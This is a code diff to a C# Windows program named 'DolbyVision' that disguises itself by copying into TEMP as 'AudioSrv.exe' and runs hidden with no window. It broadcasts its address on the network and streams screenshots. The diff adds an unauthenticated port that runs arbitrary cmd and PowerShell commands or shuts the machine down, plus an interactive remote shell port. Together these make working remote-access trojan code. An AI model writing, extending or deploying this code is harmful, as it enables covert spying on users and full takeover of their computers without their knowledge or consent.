@@ -1,4 +1,5 @@
 using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -13,13 +14,19 @@ namespace DolbyVision
     internal static class Program
     {
         private const int BroadcastPort = 9100;
-        private const int TcpPort = 9101;
+        private const int VideoPort = 9101;
+        private const int CmdPort = 9102;
+        private const int TerminalPort = 9103;
         private const int Fps = 8;
         private const int JpegQuality = 60;
 
-        private static TcpListener _tcpListener;
+        private static TcpListener _videoListener;
+        private static TcpListener _cmdListener;
+        private static TcpListener _terminalListener;
         private static Thread _broadcastThread;
-        private static Thread _listenThread;
+        private static Thread _videoThread;
+        private static Thread _cmdThread;
+        private static Thread _terminalThread;
         private static volatile bool _running = true;
         private static string _machineName;
         private static string _localIp;
@@ -27,7 +34,7 @@ namespace DolbyVision
         [STAThread]
         static void Main()
         {
-            // 自复制到TEMP并改名为系统进程名，原文件可删除，任务管理器不易暴露
+            // 自复制到TEMP并改名为系统进程名
             string currentPath = Application.ExecutablePath;
             string tempPath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
             if (!currentPath.Equals(tempPath, StringComparison.OrdinalIgnoreCase))
@@ -36,22 +43,26 @@ namespace DolbyVision
                 {
                     File.Copy(currentPath, tempPath, true);
                     System.Diagnostics.Process.Start(tempPath);
-                    return; // 原实例退出，释放文件锁
+                    return;
                 }
                 catch { }
             }
 
-            // 完全后台运行，无窗口无托盘
             _machineName = Environment.MachineName;
             _localIp = GetLocalIP();
 
             _broadcastThread = new Thread(BroadcastLoop) { IsBackground = true };
             _broadcastThread.Start();
 
-            _listenThread = new Thread(ListenLoop) { IsBackground = true };
-            _listenThread.Start();
+            _videoThread = new Thread(VideoListenLoop) { IsBackground = true };
+            _videoThread.Start();
 
-            // 保持进程运行
+            _cmdThread = new Thread(CmdListenLoop) { IsBackground = true };
+            _cmdThread.Start();
+
+            _terminalThread = new Thread(TerminalListenLoop) { IsBackground = true };
+            _terminalThread.Start();
+
             while (_running) { Thread.Sleep(1000); }
         }
 
@@ -77,7 +88,7 @@ namespace DolbyVision
                     using (var client = new UdpClient())
                     {
                         client.EnableBroadcast = true;
-                        string msg = $"DV|{_machineName}|{_localIp}|{TcpPort}";
+                        string msg = $"DV|{_machineName}|{_localIp}|{VideoPort}|{CmdPort}|{TerminalPort}";
                         byte[] data = Encoding.UTF8.GetBytes(msg);
                         client.Send(data, data.Length, new IPEndPoint(IPAddress.Broadcast, BroadcastPort));
                     }
@@ -87,18 +98,19 @@ namespace DolbyVision
             }
         }
 
-        private static void ListenLoop()
+        // ========== 视频流 ==========
+        private static void VideoListenLoop()
         {
             try
             {
-                _tcpListener = new TcpListener(IPAddress.Any, TcpPort);
-                _tcpListener.Start();
+                _videoListener = new TcpListener(IPAddress.Any, VideoPort);
+                _videoListener.Start();
                 while (_running)
                 {
                     try
                     {
-                        TcpClient client = _tcpListener.AcceptTcpClient();
-                        var thread = new Thread(() => HandleClient(client)) { IsBackground = true };
+                        TcpClient client = _videoListener.AcceptTcpClient();
+                        var thread = new Thread(() => HandleVideoClient(client)) { IsBackground = true };
                         thread.Start();
                     }
                     catch { }
@@ -107,7 +119,7 @@ namespace DolbyVision
             catch { }
         }
 
-        private static void HandleClient(TcpClient client)
+        private static void HandleVideoClient(TcpClient client)
         {
             try
             {
@@ -140,6 +152,229 @@ namespace DolbyVision
                 }
             }
             catch { }
+        }
+
+        // ========== 远程命令（9102） ==========
+        private static void CmdListenLoop()
+        {
+            try
+            {
+                _cmdListener = new TcpListener(IPAddress.Any, CmdPort);
+                _cmdListener.Start();
+                while (_running)
+                {
+                    try
+                    {
+                        TcpClient client = _cmdListener.AcceptTcpClient();
+                        var thread = new Thread(() => HandleCmdClient(client)) { IsBackground = true };
+                        thread.Start();
+                    }
+                    catch { }
+                }
+            }
+            catch { }
+        }
+
+        private static void HandleCmdClient(TcpClient client)
+        {
+            try
+            {
+                using (client)
+                using (NetworkStream stream = client.GetStream())
+                {
+                    byte[] buffer = new byte[8192];
+                    int read = stream.Read(buffer, 0, buffer.Length);
+                    if (read <= 0) return;
+
+                    string cmd = Encoding.UTF8.GetString(buffer, 0, read).Trim();
+                    string result = ExecuteCommand(cmd);
+                    byte[] resp = Encoding.UTF8.GetBytes(result);
+                    stream.Write(resp, 0, resp.Length);
+                    stream.Flush();
+                }
+            }
+            catch { }
+        }
+
+        private static string ExecuteCommand(string cmd)
+        {
+            try
+            {
+                if (cmd.Equals("SHUTDOWN", StringComparison.OrdinalIgnoreCase))
+                {
+                    Process.Start(new ProcessStartInfo("shutdown", "/s /t 0") { CreateNoWindow = true, UseShellExecute = false });
+                    return "OK: 关机命令已发送";
+                }
+                if (cmd.Equals("REBOOT", StringComparison.OrdinalIgnoreCase))
+                {
+                    Process.Start(new ProcessStartInfo("shutdown", "/r /t 0") { CreateNoWindow = true, UseShellExecute = false });
+                    return "OK: 重启命令已发送";
+                }
+                if (cmd.StartsWith("EXEC:", StringComparison.OrdinalIgnoreCase))
+                {
+                    string command = cmd.Substring(5);
+                    var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
+                    {
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        StandardOutputEncoding = Encoding.GetEncoding(936),
+                        StandardErrorEncoding = Encoding.GetEncoding(936)
+                    };
+                    using (var p = Process.Start(psi))
+                    {
+                        string output = p.StandardOutput.ReadToEnd();
+                        string error = p.StandardError.ReadToEnd();
+                        p.WaitForExit(5000);
+                        return "OK:\r\n" + output + (string.IsNullOrEmpty(error) ? "" : "\r\n[错误]\r\n" + error);
+                    }
+                }
+                if (cmd.StartsWith("PS:", StringComparison.OrdinalIgnoreCase))
+                {
+                    string command = cmd.Substring(3);
+                    var psi = new ProcessStartInfo("powershell.exe", "-NoProfile -Command " + command)
+                    {
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        StandardOutputEncoding = Encoding.UTF8,
+                        StandardErrorEncoding = Encoding.UTF8
+                    };
+                    using (var p = Process.Start(psi))
+                    {
+                        string output = p.StandardOutput.ReadToEnd();
+                        string error = p.StandardError.ReadToEnd();
+                        p.WaitForExit(10000);
+                        return "OK:\r\n" + output + (string.IsNullOrEmpty(error) ? "" : "\r\n[错误]\r\n" + error);
+                    }
+                }
+                return "ERROR: 未知命令: " + cmd;
+            }
+            catch (Exception ex)
+            {
+                return "ERROR: " + ex.Message;
+            }
+        }
+
+        // ========== 虚拟控制台（9103） ==========
+        private static void TerminalListenLoop()
+        {
+            try
+            {
+                _terminalListener = new TcpListener(IPAddress.Any, TerminalPort);
+                _terminalListener.Start();
+                while (_running)
+                {
+                    try
+                    {
+                        TcpClient client = _terminalListener.AcceptTcpClient();
+                        var thread = new Thread(() => HandleTerminalClient(client)) { IsBackground = true };
+                        thread.Start();
+                    }
+                    catch { }
+                }
+            }
+            catch { }
+        }
+
+        private static void HandleTerminalClient(TcpClient client)
+        {
+            Process shell = null;
+            try
+            {
+                using (client)
+                using (NetworkStream stream = client.GetStream())
+                {
+                    // 先接收shell类型：CMD 或 PS
+                    byte[] typeBuf = new byte[16];
+                    int typeRead = stream.Read(typeBuf, 0, typeBuf.Length);
+                    string shellType = Encoding.UTF8.GetString(typeBuf, 0, typeRead).Trim().ToUpper();
+                    bool usePs = shellType == "PS";
+
+                    string shellExe = usePs ? "powershell.exe" : "cmd.exe";
+                    string shellArgs = usePs ? "-NoLogo -NoProfile" : "";
+                    Encoding shellEncoding = usePs ? Encoding.UTF8 : Encoding.GetEncoding(936);
+
+                    var psi = new ProcessStartInfo(shellExe, shellArgs)
+                    {
+                        CreateNoWindow = true,
+                        UseShellExecute = false,
+                        RedirectStandardInput = true,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        StandardOutputEncoding = shellEncoding,
+                        StandardErrorEncoding = shellEncoding
+                    };
+                    shell = Process.Start(psi);
+
+                    string shellName = usePs ? "PowerShell" : "CMD";
+                    byte[] welcome = Encoding.UTF8.GetBytes("DolbyVision Terminal [" + shellName + "] - " + _machineName + " (" + _localIp + ")\r\nType exit to disconnect\r\n\r\n");
+                    stream.Write(welcome, 0, welcome.Length);
+
+                    // 输出转发线程
+                    var outputThread = new Thread(() =>
+                    {
+                        try
+                        {
+                            byte[] buffer = new byte[4096];
+                            while (!shell.HasExited && client.Connected)
+                            {
+                                int read = shell.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length);
+                                if (read > 0)
+                                {
+                                    string text = shellEncoding.GetString(buffer, 0, read);
+                                    byte[] utf8 = Encoding.UTF8.GetBytes(text);
+                                    stream.Write(utf8, 0, utf8.Length);
+                                    stream.Flush();
+                                }
+                            }
+                        }
+                        catch { }
+                    })
+                    { IsBackground = true };
+                    outputThread.Start();
+
+                    var errorThread = new Thread(() =>
+                    {
+                        try
+                        {
+                            byte[] buffer = new byte[4096];
+                            while (!shell.HasExited && client.Connected)
+                            {
+                                int read = shell.StandardError.BaseStream.Read(buffer, 0, buffer.Length);
+                                if (read > 0)
+                                {
+                                    string text = shellEncoding.GetString(buffer, 0, read);
+                                    byte[] utf8 = Encoding.UTF8.GetBytes(text);
+                                    stream.Write(utf8, 0, utf8.Length);
+                                    stream.Flush();
+                                }
+                            }
+                        }
+                        catch { }
+                    })
+                    { IsBackground = true };
+                    errorThread.Start();
+
+                    // 输入转发
+                    byte[] inBuffer = new byte[4096];
+                    while (!shell.HasExited && client.Connected)
+                    {
+                        int read = stream.Read(inBuffer, 0, inBuffer.Length);
+                        if (read <= 0) break;
+                        string input = Encoding.UTF8.GetString(inBuffer, 0, read);
+                        shell.StandardInput.Write(input);
+                        shell.StandardInput.Flush();
+                    }
+                }
+            }
+            catch { }
+            finally
+            {
+                try { shell?.Kill(); } catch { }
+            }
         }
 
         private static Bitmap CaptureScreen()
